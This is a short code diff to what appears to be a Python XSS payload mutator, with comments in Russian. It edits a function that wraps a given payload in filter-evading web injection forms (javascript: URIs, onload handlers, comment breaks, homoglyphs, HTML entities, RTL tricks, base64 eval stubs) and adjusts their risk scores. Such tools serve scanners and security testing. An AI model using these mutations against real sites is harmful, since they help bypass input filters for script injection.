@@ -75,6 +75,10 @@ FAMILY_POLYGLOT = "polyglot"
 #  Вспомогательные мутации
 # ============================================================
 
+#def shutdown_mutator_executor():
+#    """Корректно завершает пул потоков PayloadMutator."""
+#    _EXECUTOR.shutdown(wait=False)
+
 def _jsfuck_stub(payload: str) -> str:
     b64 = base64.b64encode(payload.encode()).decode()
     return f"/*jsfuck*/eval(atob('{b64}'))"
@@ -146,7 +150,6 @@ def _base_mutations(base_payload: str) -> List[MutationResult]:
     add(f"javascript:{base_payload}", risk=70, tags=["javascript_uri"])
     add(f'<body onload="{base_payload}">', risk=75, tags=["body_onload"])
     add(f'<a href="javascript:{base_payload}">click</a>', risk=70, tags=["link_js"])
-    add(f"<!-->{base_payload}--><script>{base_payload}</script>", risk=80, tags=["comment_break"])
     add(_homoglyph(base_payload), risk=65, tags=["homoglyph"])
     add(urllib.parse.quote(base_payload + _random_noise()), risk=55, tags=["noise"])
     add(_jsfuck_stub(base_payload), risk=90, tags=["jsfuck_stub"])
@@ -159,7 +162,7 @@ def _base_mutations(base_payload: str) -> List[MutationResult]:
     add(f'{{"x":"{base_payload}"}}', risk=55, tags=["json"])
     add("".join(f"&#{ord(c)};" for c in base_payload), risk=60, tags=["html_entities"])
     add(_rtl_inject(base_payload), risk=65, tags=["rtl"])
-    add(_comment_break(base_payload), risk=70, tags=["comment_break"])
+    add(_comment_break(base_payload), risk=80, tags=["comment_break"])
 
     return muts
 
